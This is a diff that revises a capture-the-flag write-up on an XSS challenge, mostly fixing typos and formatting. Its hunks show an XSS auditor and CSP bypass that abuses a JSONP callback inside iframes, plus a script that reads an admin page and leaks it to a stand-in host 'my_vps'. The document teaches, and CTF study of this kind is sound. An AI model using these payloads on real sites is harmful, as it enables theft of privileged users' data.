@@ -69,8 +69,10 @@ There is also a note in the bottom of the page suggesting that we should try
 to access this page from `127.0.0.1:8080` rather than from the external host
 (`bypasses-everywhere.ctf.insecurity-insa.fr`) :
 
-> You're currently seeing this page from an unknown IP address.
-> I'm usually connecting to this page by clicking a link from another hidden page on http://127.0.0.1:8080, so I'm pretty sure this page is safe :)
+```
+You're currently seeing this page from an unknown IP address.
+I'm usually connecting to this page by clicking a link from another hidden page on http://127.0.0.1:8080, so I'm pretty sure this page is safe :)
+```
 
 This gives us an idea of what we have to do : Find an XSS on the website, send it to the admin,
 and make the admin leak the contents of `http://127.0.0.1:8080/admin` to us.
@@ -80,7 +82,7 @@ and make the admin leak the contents of `http://127.0.0.1:8080/admin` to us.
 Before moving forward, we must check what browser the admin is using. This is important, since
 different browsers have different behaviors, as well as potential XSS auditors.
 
-I believe most XSS challenges these days uses Puppeteer, which is a Node library for the Google
+I believe most XSS challenges these days use Puppeteer, which is a Node library for the Google
 Chrome headless browser. It's very likely that our admin will be using Chrome.
 
 We can confirm this by filling the admin page's form with a host we control and setting up
@@ -148,7 +150,7 @@ above will not work in Chrome :
 ![chrome_block](/assets/img/inshack-2019/chrome_block.png)
 
 The red blocks above represent snippets of code that are blocked by the XSS auditor.
-Chrome recognized that these are the result of an XSS attack and tries to block the payload
+Chrome recognized that these are the result of an XSS attack and tries to block the payloads
 accordingly.
 
 The way this is detected is pretty straightforward : Chrome looks for "malicious" sequences of
@@ -166,7 +168,7 @@ Luckily, since we have two vulnerable parameters, we can bypass the auditor easi
 
 # Bypassing CSP
 
-As mentionned earlier, our goal is to send an XSS payload to the admin in order to make him
+As mentioned earlier, our goal is to send an XSS payload to the admin in order to make him
 leak the contents of `http://127.0.0.1:8080/admin` to us.
 
 With the XSS auditor out of the way, we should technically be able to do this with a
@@ -179,9 +181,9 @@ var req = new XMLHttpRequest();
 // Send a request to /admin
 req.open('GET', 'http://127.0.0.1:8080/admin');
 
-// Fetch the contents of /admin and send it to http://my_domain/leak.txt?[admin_page_content]
+// Fetch the contents of /admin and send it to http://my_vps:1337/leak.txt?[admin_page_content]
 req.onreadystatechange = function() {
-  document.write('<img src=http://my_domain:1337/leak.txt?' + btoa(this.responseText) + '>');
+  document.write('<img src=http://my_vps:1337/leak.txt?' + btoa(this.responseText) + '>');
 };
 
 req.send();
@@ -242,7 +244,7 @@ In order to bypass this restriction, I've decided to focus on finding a way to g
 XSS on the `/admin` page via the XSS on the `/article` page. The `/admin` page doesn't
 have any CSP rules, therefore an XSS on `/admin` would allow us to leak its contents easily.
 
-> Note : I mentionned earlier that there was already an XSS on /admin. Unfortunately, that XSS
+> Note : I mentioned earlier that there was already an XSS on /admin. Unfortunately, that XSS
 is blocked by the XSS auditor, and we couldn't find any bypasses for it.
 
 ## Introducing iframes
@@ -281,7 +283,7 @@ and `frame3` because its origin (`https://some_random_domain`) is different.
 
 ## Bypassing CSP : Obtaining XSS on /admin
 
-Using the behavior mentionned above, we can obtain XSS on /admin like so :
+Using the behavior mentioned above, we can obtain XSS on /admin like so :
 
 1. Host a page with 2 iframes : one pointing to /admin and another pointing to /article
 2. Trigger the XSS on /article using the `top.admin_frame.setTimeout` callback parameter, which
@@ -299,7 +301,7 @@ Here is the final payload (`my_vps` is my own box hosted somewhere online) :
 <!-- Code hosted on http://my_vps:1337/ -->
 
 <!-- /article frame containing our initial XSS payload / CSP bypass -->
-<iframe src="http://127.0.0.1:8080/article?time=<script/src='&unit=https://www.google.com/complete/search?client=chrome%26q=document.write(%2522<script+src=//my_vps:1337/payload.js></script>%2522)//%26callback%3Dtop.frames.target.setTimeout'></script>"></iframe>
+<iframe src="http://127.0.0.1:8080/article?time=<script/src='&unit=https://www.google.com/complete/search?client=chrome%26q=document.write(%2522<script+src=//my_vps:1337/payload.js></script>%2522)//%26callback%3Dtop.target.setTimeout'></script>"></iframe>
 
 <!-- Target iframe pointing to /admin -- The HTML in this frame will be overwritten -->
 <iframe name="target" src="http://127.0.0.1:8080/admin"></iframe>
@@ -310,7 +312,7 @@ any code hosted on `http://my_vps/payload.js` will be executed.
 
 ![xss_admin](/assets/img/inshack-2019/xss_admin.png)
 
-Finally we can host our original payload in order to leak /admin :
+Finally we can host our original payload in payload.js order to leak /admin :
 
 ```js
 var req = new XMLHttpRequest();
@@ -343,7 +345,7 @@ Press Ctrl-C to quit.
 # Getting the flag
 
 Using the previous XSS, we were able to leak the contents of `http://127.0.0.1:8080/admin`.
-Here's what the code looks like :
+Here's what the page looks like :
 
 ```
 <!DOCTYPE html>
